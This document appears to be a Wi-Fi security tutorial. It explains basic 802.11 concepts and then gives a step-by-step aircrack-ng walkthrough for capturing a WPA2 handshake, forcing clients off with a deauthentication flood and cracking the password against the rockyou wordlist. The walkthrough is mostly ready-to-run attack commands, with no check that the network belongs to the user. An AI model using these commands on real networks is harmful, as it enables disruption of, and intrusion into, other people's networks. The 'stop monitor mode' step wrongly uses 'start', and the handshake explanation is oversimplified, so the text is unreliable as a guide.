# Wireless Networking Fundamentals
1. 📶 What Is Wireless Networking?
Wireless networking allows devices to connect to a network (typically the internet) using radio waves instead of cables.

The most common type is Wi-Fi, which follows the IEEE 802.11 standard.

## Terms
- SSID (Service Set Identifier): The name of a Wi-Fi network (e.g., MyHomeWiFi)
- BSSID (Basic Service Set Identifier): The MAC address of the Access Point (e.g., 58:6D:8F:1D:2C:9A)
- AP (Access Point): The device (usually your router) that broadcasts the network
## Wi-Fi Security Protocols

Aircrack-ng is commonly used to test the security of WEP and WPA/WPA2-PSK networks.

| Protocol | Security Level | Status                    |
| -------- | -------------- | ------------------------- |
| **WEP**  | Very Weak      | Obsolete (easily cracked) |
| **WPA**  | Weak           | Obsolete                  |
| **WPA2** | Strong         | Still widely used         |
| **WPA3** | Strongest      | Newest, more secure       |


##  Wi-Fi Modes

Wireless cards can operate in different modes:

| Mode             | Description                                                 |
| ---------------- | ----------------------------------------------------------- |
| **Managed Mode** | Normal mode – connects to AP                                |
| **Monitor Mode** | Listens to all wireless traffic – needed for packet capture |
| **Master Mode**  | Acts as an Access Point                                     |
| **Ad-hoc Mode**  | Device-to-device communication without a router             |

## 802.11 Packet Types
| Type           | Purpose                                                  |
| -------------- | -------------------------------------------------------- |
| **Management** | Establish and maintain connections (e.g., beacon, probe) |
| **Control**    | Help with delivery of data (e.g., RTS/CTS, ACK)          |
| **Data**       | Actual payload (your internet traffic)                   |

##  4-Way Handshake (WPA/WPA2)

When a client connects to a WPA/WPA2-secured network, a 4-step handshake occurs:

AP sends a nonce (random number) to client.

Client uses that nonce + password to generate key.

Client sends its own nonce to AP.

AP confirms and both now share the key.

Capturing this handshake is the first step in cracking WPA/WPA2 using Aircrack-ng.


## Step-by-Step: WPA2 Handshake Capture & Crack
Step 1: Set Up Environment
```
sudo apt update && sudo apt install aircrack-ng
```

Check Wi-Fi interface:
```
iwconfig
```

Step 2: Enable Monitor Mode

Killing interface process `sudo airmon-ng check kill` starting monitor mode `sudo airmon-ng start wlan0`.verify you in monitor mode `iwconfig`
```
sudo airmon-ng check kill          # Stop conflicting processes
sudo airmon-ng start wlan0         # Replace wlan0 with your interface name

```


Step 3: Capture Handshake
Scan networks
```
sudo airodump-ng wlan0mon
```
Look for your router's SSID and BSSID. Press Ctrl+C once you see it.

Then:
```
sudo airodump-ng --bssid <BSSID> --channel <CH> -w handshake wlan0mon
```

Force Handshake via Deauthentication

```
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

This will disconnect a client. When it reconnects, a handshake will be captured.

Check handshake capture:
```
aircrack-ng handshake-01.cap
```

Crack the WPA2 Password

ou need a wordlist. Kali has one at /usr/share/wordlists/rockyou.txt.gz:
```
gunzip /usr/share/wordlists/rockyou.txt.gz
```

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> handshake-01.cap
```




stopping monitor mode:
```
sudo airmon-ng start wlan0mon
```

start 
```
sudo systemctl start NetworkManager
```









